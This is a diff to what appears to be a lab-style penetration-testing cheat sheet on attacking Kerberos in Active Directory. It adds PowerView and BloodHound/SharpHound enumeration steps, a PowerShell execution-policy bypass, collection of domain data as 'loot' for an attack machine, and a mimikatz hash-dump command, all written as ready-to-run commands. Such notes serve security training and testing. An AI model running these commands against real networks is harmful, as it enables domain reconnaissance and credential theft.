@@ -1,5 +1,7 @@
 # Attacking Kerberos
 * [Enumeration with Kerbrute](#enumeration-with-kerbrute)
+* [Enumeration with PowerView](#enumeration-with-powerview)
+* [Enumeration with Bloodhound](#enumeration-with-bloodhound)
 * [Harvesting and Brute Forcing Tickets with Rubeus](#harvesting-and-brute-forcing-tickets-with-rubeus)
 * [Kerberoasting with Rubeus and Impacket](#kerberoasting-with-rubeus-and-impacket)
 * [AS-REP Roasting with Rubeus](#as-rep-roasting-with-rubeus)
@@ -25,6 +27,71 @@ Example:
 ```
 ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
 ```
+*********************************************************************************
+## Enumeration with PowerView
+
+Download PowerView:
+* https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+
+Start PowerShell and bypass execution policy to easily run scripts:
+```
+powershell -ep bypass
+```
+
+Start PowerView: 
+```
+. .\Powerview.ps1
+```
+
+Enumerate domain users:
+```
+Get-NetUser | select cn
+```
+
+Enumerate domain groups:
+```
+Get-NetGroup -GroupName *admin*
+```
+
+Command cheatsheet:
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+*********************************************************************************
+## Enumeration with Bloodhound
+
+### Bloodhound Installation
+
+```
+apt-get install bloodhound
+```
+```
+neo4j console
+```
+Default credentials: neo4j:neo4j
+
+### Getting loot with SharpHound
+
+```
+powershell -ep bypass
+```
+```
+. .\Downloads\SharpHound.ps1
+```
+```
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+```
+*Transfer loot.zip to attack machine*
+
+### Mapping the Network with Bloodhound
+
+* Run bloodhound on attack machine:
+```
+bloodhound
+```
+* Sign in with same credentials set with Neo4j
+* Import the loot.zip folder
+* Open menu and select queries
+
 *********************************************************************************
 ## Harvesting and Brute Forcing Tickets with Rubeus
 
@@ -113,6 +180,11 @@ mimikatz.exe
 Ensure proper privileges: (output '20' OK)
 ```
 privilege::debug
+```
+
+Dump hashes:
+```
+lsadump::lsa /patch
 ```
 
 Export all .kirbi tickets into current directory:
